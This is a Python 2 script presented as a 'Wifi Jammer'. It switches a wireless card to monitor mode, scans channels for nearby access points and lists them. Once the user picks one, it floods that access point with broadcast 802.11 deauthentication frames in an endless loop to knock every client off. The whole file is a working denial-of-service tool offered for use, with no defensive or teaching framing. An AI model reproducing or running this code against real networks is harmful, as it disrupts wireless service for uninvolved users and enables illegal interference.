#      Wifi Jammer >> Sending deauthentication packets into APs.
#					  Applying DOS attack on the clients.

#	   Written by : OsaMa Zidan
#      Date       : 12 Jan , 2018


# Your interface should support monitor mode !
# Running only on Linux !



#!/usr/bin/env python
#_*_ encoding: utf-8 _*_


from scapy.all import *
import os, sys, signal, time
from multiprocessing import Process
from subprocess import Popen, PIPE


#interface = 'wlan0'

class bcolors:
    OKRED  = '\033[31m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


logo =														  bcolors.OKBLUE +\
		"..............                                     \n" +\
		"            ..,;:ccc,.                             \n" +\
		"          ......''';lxO.                           \n" +\
		".....''''..........,:ld;                           \n" +\
		"           .';;;:::;,,.x,                          \n" +\
		"      ..'''.            0Xxoc:,.  ...              \n" +\
		"  ....                ,ONkc;,;cokOdc',.            \n" +\
		" .                   OMo           ':ddo.          \n" +\
		"                    dMc               :OO;         \n" +\
		"                    0M.                 .:o.       \n" +\
		"                    ;Wd                            \n" +\
		"                     ;XO,                          \n" +\
		"                       ,d0Odlc;,..                 \n" +\
		"                           ..',;:cdOOd::,.         \n" +\
		"                                    .:d;.':;.      \n" +\
		"                                       'd,  .'     \n" +\
		"          E g x H e r o                  ;l   ..   \n" +\
		"            (((  )))                      .o       \n" +\
		"                                            c      \n" +\
		"                                            .'     \n" +\
		"                                             .     \n" + bcolors.ENDC +\
		"        %sVersion 1.0 Demo%s                       \n" %(bcolors.OKRED, bcolors.ENDC)
		



def packetHandler(pkt):         
	global n     #index dictionary 

	if ( (pkt.haslayer(Dot11Beacon))):
		bssid = pkt[Dot11].addr3
		ssid  = pkt[Dot11Elt].info
		channel = int(ord(pkt[Dot11Elt:3].info))

		#capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
		#	Dot11ProbeResp:%Dot11ProbeResp.cap%")
	
        #if re.search('privacy', capability): enc = 'Y'
		#else: enc = 'N'

		#aps[pkt[Dot11].addr3] = enc


		if pkt[Dot11].addr3 not in aps:
			aps[ bssid ] = (n, channel, ssid)
			print '\t[%.2d]\t'%n , '%s\t'%channel  , '%s\t'%bssid , '%s'% ssid
			n += 1
			

# scanning on several channels
def channelHoper():


	while True:
	
		try:				
			channel = random.randrange(1,15)
			os.system('iw dev %s set channel %d 2> /dev/null' %(interface,channel))
			time.sleep(0.3)
		except KeyboardInterrupt:
			break
	
	
# preparing deauth packets to send it 
def block(client=None , station=None):
	

	c = client or 'FF:FF:FF:FF:FF:FF'

	if not station:	
		return None

	pkt = RadioTap()/Dot11(addr1=c ,addr2= station, addr3=station)/Dot11Deauth()

	return pkt



# send Deauthentication packets
def packetSender(interface, pkt,gap=0.02):
	

	print '[+]  %sStart Sending Deauthentication packets ...%s' % (bcolors.WARNING, bcolors.ENDC)
	while True:

		try:
			sendp(pkt, iface=interface )
			time.sleep(gap)		
		except  KeyboardInterrupt:
			break
			exit(0)
	
	

def signalHandler(signal,frame):
	#terminate a process >>>  channelHoper()	
	p1.terminate()


def terminator(signal,frame):
	
	#return inteface to Managed (normal) mode  
	try:
		os.system('ip link set %s down'% interface)
		os.system('iw %s set type managed' % interface)
		os.system('ip link set %s up' % interface)
		os.system('service NetworkManager restart')
	except Exception as e:
		#print str(e)
		pass

	print '\r[-] %sExiting the script.%s' %(bcolors.OKGREEN, bcolors.ENDC)
	exit(0)

def main(*args, **kwargs):


	print '\r[*]  %sStart scanning for ACTIVE APs Points, ...%s'% (bcolors.OKGREEN, bcolors.ENDC) 
	print '%s    click CTRL+C to stop scanning.%s' %(bcolors.OKBLUE, bcolors.ENDC)
	print '\n=-=-=-=-=-=-=-=-=-= %sPackets Captured%s =-=-=-=-=-=-=-=-=-=\n' %(bcolors.HEADER, bcolors.ENDC)
	print bcolors.OKGREEN + '\tn\t', 'CH\t', 'BSSID\t', '\t\tSSID' + bcolors.ENDC

	sniff(prn=packetHandler, iface=interface, timeout=ap_timeout)
	signal.signal(signal.SIGINT, signalHandler)


	print '\r'
	print '[*]  %sChoose an AP to deauth : %s'% (bcolors.OKGREEN, bcolors.ENDC),

	try:
		usr = int(raw_input())
	except:
		print '[-]  %splease supply an integer from above!%s' %(bcolors.OKRED, bcolors.ENDC)
		exit(1)

	victim = ''
	for i,j in aps.items():
		if j[0] == usr:
			victim = i
			break
	if not victim:
		print ' [-] %sIncorrect Input or No found APs !%s' %(bcolors.OKRED, bcolors.ENDC)
		exit(1)


	signal.signal(signal.SIGINT, terminator)
	packetSender(interface, block(station=victim))
	
		



if __name__ == '__main__':


	n = 1      #index for discovered APs 
	aps =  {}  #discovered APs
	ap_timeout = None

	print logo

	if os.getuid() != 0:
		print ' [-] %sYou should run as root !%s' %(bcolors.OKRED, bcolors.ENDC)
		exit(1)

	
	if len(sys.argv) < 2:
		print ' [-] %sPLease supply an interface as an option !%s' %(bcolors.OKRED, bcolors.ENDC)
		exit(1)
	else:
		interface = sys.argv[1]
		print '[*]  %sYou selected %s %s\n' %(bcolors.OKGREEN,bcolors.ENDC,  interface )



	# unblock interfaces
	os.system('rfkill unblock all')

	# check if there're interfaces in monitor mode
	# I used std-error to handle the result and print
	checkIfaces = Popen(["iwconfig 2>&1 | grep Monitor | awk '{print $1}'"] , shell=True, stderr=PIPE).communicate()

	# push interfaces into monitor mode

	if interface not in checkIfaces:
		try:
			os.system('ip link set %s down'% interface)
			os.system('iw %s set monitor control' % interface)
			os.system('ip link set %s up' % interface)
		except Exception as e:
			#print str(e)
			pass

	p1 = Process(target=channelHoper)
	p1.start()

	main()

